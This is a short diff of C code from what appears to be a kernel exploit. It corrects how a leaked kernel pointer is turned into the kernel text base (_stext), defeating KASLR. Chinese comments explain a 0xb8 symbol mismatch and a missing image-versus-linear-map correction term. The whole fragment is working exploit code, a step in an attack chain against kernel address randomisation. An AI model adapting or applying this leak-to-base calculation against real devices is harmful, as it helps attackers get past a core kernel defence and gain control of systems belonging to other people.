@@ -361,8 +361,12 @@ uint64_t slide_read_stext(void) {
     return 0;
   }
 
-  uint64_t off = p0_alias_image_offset(SLIDE_NFULNL_LOGGER);
-  uint64_t stext = leaked - off;
+  /* 必须与 words[] 写入的符号一致(SLIDE_LOGGERS_0_1,非 SLIDE_NFULNL_LOGGER,
+   * 二者差 0xb8);且要加 KIMAGE-vs-线性映射 修正项,否则 stext 偏 0x80000000+0xb8
+   * (S26 官方注释: old SLIDE_NFULNL_LOGGER formula poisons kaslr_base) */
+  uint64_t off = p0_alias_image_offset(SLIDE_LOGGERS_0_1);
+  uint64_t stext = leaked - off +
+      (KIMAGE_TEXT_BASE - DIRECT_MAP_BASE - P0_KERNEL_PHYS_LOAD);
   pr_success("slide boot_id_leaked_nfulnl_logger pid=%d value=%016llx stext=%016llx\n",
              getpid(), (unsigned long long)leaked, (unsigned long long)stext);
   pr_success("slide boot_id-derived_stext pid=%d value=%016llx\n",
